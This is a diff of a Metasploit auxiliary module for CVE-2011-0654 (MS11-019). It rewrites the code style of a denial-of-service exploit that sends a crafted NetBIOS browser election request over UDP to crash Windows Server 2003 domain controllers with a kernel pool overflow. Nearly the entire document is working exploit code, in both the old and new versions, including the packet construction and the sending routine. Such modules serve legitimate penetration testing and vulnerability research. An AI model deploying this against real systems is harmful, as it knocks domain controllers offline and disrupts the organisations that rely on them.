@@ -1,182 +1,174 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Udp
+  # include Msf::Exploit::Remote::SMB::Client
+  include Auxiliary::Dos
 
-class Metasploit3 < Msf::Auxiliary
-	Rank = ManualRanking
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Windows Browser Pool DoS',
+        'Description' => %q{
+          This module exploits a denial of service flaw in the Microsoft
+          Windows SMB service on versions of Windows Server 2003 that have been
+          configured as a domain controller. By sending a specially crafted election
+          request, an attacker can cause a pool overflow.
 
-	include Msf::Exploit::Remote::Udp
-	#include Msf::Exploit::Remote::SMB
-	include Auxiliary::Dos
+          The vulnerability appears to be due to an error handling a length value
+          while calculating the amount of memory to copy to a buffer. When there are
+          zero bytes left in the buffer, the length value is improperly decremented
+          and an integer underflow occurs. The resulting value is used in several
+          calculations and is then passed as the length value to an inline memcpy
+          operation.
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Microsoft Windows Browser Pool DoS',
-			'Description'    => %q{
-					This module exploits a denial of service flaw in the Microsoft
-				Windows SMB service on versions of Windows Server 2003 that have been
-				configured as a domain controller. By sending a specially crafted election
-				request, an attacker can cause a pool overflow.
+          Unfortunately, the length value appears to be fixed at -2 (0xfffffffe) and
+          causes considerable damage to kernel heap memory. While theoretically possible,
+          it does not appear to be trivial to turn this vulnerability into remote (or
+          even local) code execution.
+        },
+        'References' => [
+          [ 'CVE', '2011-0654' ],
+          [ 'BID', '46360' ],
+          [ 'OSVDB', '70881' ],
+          [ 'MSB', 'MS11-019' ],
+          [ 'EDB', '16166' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2011/Feb/285' ]
+        ],
+        'Author' => [ 'Cupidon-3005', 'jduck' ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
-				The vulnerability appears to be due to an error handling a length value
-				while calculating the amount of memory to copy to a buffer. When there are
-				zero bytes left in the buffer, the length value is improperly decremented
-				and an integer underflow occurs. The resulting value is used in several
-				calculations and is then passed as the length value to an inline memcpy
-				operation.
+    register_options(
+      [
+        Opt::RPORT(138),
+        OptString.new('DOMAIN', [ true, 'The name of the domain that the target controls' ])
+      ]
+    )
+  end
 
-				Unfortunately, the length value appears to be fixed at -2 (0xfffffffe) and
-				causes considerable damage to kernel heap memory. While theoretically possible,
-				it does not appear to be trivial to turn this vulnerability into remote (or
-				even local) code execution.
-			},
-			'References'     =>
-				[
-					[ 'CVE', '2011-0654' ],
-					[ 'BID', '46360' ],
-					[ 'OSVDB', '70881' ],
-					[ 'MSB', 'MS11-019' ],
-					[ 'EDB', 16166 ],
-					[ 'URL', 'http://seclists.org/fulldisclosure/2011/Feb/285' ]
-				],
-			'Author'         => [ 'Cupidon-3005', 'jduck' ],
-			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$'
-		))
+  def run
+    connect_udp
+    @client = Rex::Proto::SMB::Client.new(udp_sock)
 
-		register_options(
-			[
-				Opt::RPORT(138),
-				OptString.new('DOMAIN', [ true, "The name of the domain that the target controls" ])
-			], self.class)
-	end
+    ip = Rex::Socket.source_address(datastore['RHOST'])
+    ip_src = Rex::Socket.resolv_nbo(ip, false)
 
+    svc_src = "\x41\x41\x00" # pre-encoded?
+    name_src = Rex::Text.rand_text_alphanumeric(15) # 4+rand(10))
 
-	def run
+    svc_dst = "\x42\x4f\x00" # pre-encoded?
+    name_dst = datastore['DOMAIN']
 
-		connect_udp
-		@client = Rex::Proto::SMB::Client.new(udp_sock)
+    pipe = '\\MAILSLOT\\BROWSER'
 
-		ip = Rex::Socket.source_address(datastore['RHOST'])
-		ip_src = Rex::Socket.gethostbyname(ip)[3]
+    election =
+      "\x08" +              # Election Request
+      "\x09" +              # Election Version
+      "\xa8" +              # election desire - Domain Master & WINS & NT
+      "\x0f" +              # Browser Protocol Major Version
+      "\x01" +              # Browser Protocol Minor Version
+      "\x20" +              # Election OS (NT Server)
+      "\x1b\xe9\xa5\x00" +  # Uptime
+      "\x00\x00\x00\x00" +  # NULL... Padding?
+      # ("A" * 4) + "\x00"
+      Rex::Text.rand_text_alphanumeric(410) + "\x00"
 
-		svc_src = "\x41\x41\x00"   # pre-encoded?
-		name_src = Rex::Text.rand_text_alphanumeric(15) # 4+rand(10))
+    nbdghdr =
+      "\x11" +              # DIRECT_GROUP datagram
+      "\x02" +              # first and only fragment
+      [rand(0xffff)].pack('n') + # Transaction Id (DGM_ID)
+      ip_src +
+      "\x00\x8a" +          # Source Port (138)
+      "\x00\xa7" +          # DGM_LENGTH, patched in after
+      "\x00\x00"            # PACKET_OFFSET
 
-		svc_dst = "\x42\x4f\x00"   # pre-encoded?
-		name_dst = datastore['DOMAIN']
+    nbdgs = nbdghdr +
+            half_ascii(name_src, svc_src) +
+            half_ascii(name_dst, svc_dst)
 
-		pipe = "\\MAILSLOT\\BROWSER"
+    # A Trans request for the mailslot
+    nbdgs << trans_mailslot(pipe, '', election)
 
-		election =
-			"\x08" +              # Election Request
-			"\x09" +              # Election Version
-			"\xa8" +              # election desire - Domain Master & WINS & NT
-			"\x0f" +              # Browser Protocol Major Version
-			"\x01" +              # Browser Protocol Minor Version
-			"\x20" +              # Election OS (NT Server)
-			"\x1b\xe9\xa5\x00" +  # Uptime
-			"\x00\x00\x00\x00" +  # NULL... Padding?
-			#("A" * 4) + "\x00"
-			Rex::Text.rand_text_alphanumeric(410) + "\x00"
+    # Patch up the length (less the nb header)
+    nbdgs[0x0a, 2] = [nbdgs.length - nbdghdr.length].pack('n')
 
-		nbdghdr =
-			"\x11" +              # DIRECT_GROUP datagram
-			"\x02" +              # first and only fragment
-			[rand(0xffff)].pack('n') +  # Transation Id (DGM_ID)
-			ip_src +
-			"\x00\x8a" +          # Source Port (138)
-			"\x00\xa7" +          # DGM_LENGTH, patched in after
-			"\x00\x00"            # PACKET_OFFSET
+    print_status('Sending specially crafted browser election request..')
+    # print_status("\n" + Rex::Text.to_hex_dump(nbdgs))
+    udp_sock.put(nbdgs)
 
-		nbdgs = nbdghdr +
-			half_ascii(name_src, svc_src) +
-			half_ascii(name_dst, svc_dst)
+    print_status('The target should encounter a blue screen error now.')
 
-		# A Trans request for the mailslot
-		nbdgs << trans_mailslot(pipe, '', election)
+    disconnect_udp
+  end
 
-		# Patch up the length (less the nb header)
-		nbdgs[0x0a, 2] = [nbdgs.length - nbdghdr.length].pack('n')
+  # Perform a browser election request using the specified subcommand, parameters, and data
+  def trans_mailslot(pipe, param = '', body = '')
+    # Null-terminate the pipe parameter if needed
+    if (pipe[-1, 1] != "\x00")
+      pipe << "\x00"
+    end
 
-		print_status("Sending specially crafted browser election request..")
-		#print_status("\n" + Rex::Text.to_hex_dump(nbdgs))
-		udp_sock.put(nbdgs)
+    pkt = Rex::Proto::SMB::Constants::SMB_TRANS_PKT.make_struct
+    @client.smb_defaults(pkt['Payload']['SMB'])
 
-		print_status("The target should encounter a blue screen error now.")
+    setup_count = 3
+    setup_data = [1, 0, 2].pack('v*')
 
-		disconnect_udp
+    data = pipe + param + body
 
-	end
+    base_offset = pkt.to_s.length + (setup_count * 2) - 4
+    param_offset = base_offset + pipe.length
+    data_offset = param_offset + param.length
 
+    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_TRANSACTION
+    pkt['Payload']['SMB'].v['Flags1'] = 0x0
+    pkt['Payload']['SMB'].v['Flags2'] = 0x0
+    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count
 
-	# Perform a browser election request using the specified subcommand, parameters, and data
-	def trans_mailslot(pipe, param = '', body = '')
+    pkt['Payload'].v['ParamCountTotal'] = param.length
+    pkt['Payload'].v['DataCountTotal'] = data.length
+    pkt['Payload'].v['ParamCountMax'] = 0
+    pkt['Payload'].v['DataCountMax'] = 0
 
-		# Null-terminate the pipe parameter if needed
-		if (pipe[-1,1] != "\x00")
-			pipe << "\x00"
-		end
+    pkt['Payload'].v['ParamCount'] = param.length
+    pkt['Payload'].v['ParamOffset'] = param_offset if !param.empty?
+    pkt['Payload'].v['DataCount'] = body.length
+    pkt['Payload'].v['DataOffset'] = data_offset
+    pkt['Payload'].v['SetupCount'] = setup_count
+    pkt['Payload'].v['SetupData'] = setup_data
 
-		pkt = Rex::Proto::SMB::Constants::SMB_TRANS_PKT.make_struct
-		@client.smb_defaults(pkt['Payload']['SMB'])
+    pkt['Payload'].v['Payload'] = data
 
-		setup_count = 3
-		setup_data = [1, 0, 2].pack('v*')
+    exploit = pkt.to_s
 
-		data = pipe + param + body
+    # Strip off the netbios header (thx, but no thx!)
+    exploit[4, exploit.length - 4]
+  end
 
-		base_offset = pkt.to_s.length + (setup_count * 2) - 4
-		param_offset = base_offset + pipe.length
-		data_offset = param_offset + param.length
+  def half_ascii(name, svc)
+    ret = ' '
+    name.unpack('C*').each do |byte|
+      ret << [0x41 + (byte >> 4)].pack('C')
+      ret << [0x41 + (byte & 0xf)].pack('C')
+    end
+    left = 15 - name.length
+    if left > 0
+      ret << "\x43\x41" * left
+    end
 
-		pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_TRANSACTION
-		pkt['Payload']['SMB'].v['Flags1'] = 0x0
-		pkt['Payload']['SMB'].v['Flags2'] = 0x0
-		pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count
-
-		pkt['Payload'].v['ParamCountTotal'] = param.length
-		pkt['Payload'].v['DataCountTotal'] = data.length
-		pkt['Payload'].v['ParamCountMax'] = 0
-		pkt['Payload'].v['DataCountMax'] = 0
-
-		pkt['Payload'].v['ParamCount'] = param.length
-		pkt['Payload'].v['ParamOffset'] = param_offset if param.length > 0
-		pkt['Payload'].v['DataCount'] = body.length
-		pkt['Payload'].v['DataOffset'] = data_offset
-		pkt['Payload'].v['SetupCount'] = setup_count
-		pkt['Payload'].v['SetupData'] = setup_data
-
-		pkt['Payload'].v['Payload'] = data
-
-		exploit = pkt.to_s
-
-		# Strip off the netbios header (thx, but no thx!)
-		exploit[4, exploit.length - 4]
-	end
-
-
-	def half_ascii(name, svc)
-		ret = " "
-		name.unpack('C*').each { |byte|
-			ret << [0x41 + (byte >> 4)].pack('C')
-			ret << [0x41 + (byte & 0xf)].pack('C')
-		}
-		left = 15 - name.length
-		if left > 0
-			ret << "\x43\x41" * left
-		end
-
-		# In our case, svc is already encoded..
-		ret << svc
-		ret
-	end
-
+    # In our case, svc is already encoded..
+    ret << svc
+    ret
+  end
 end
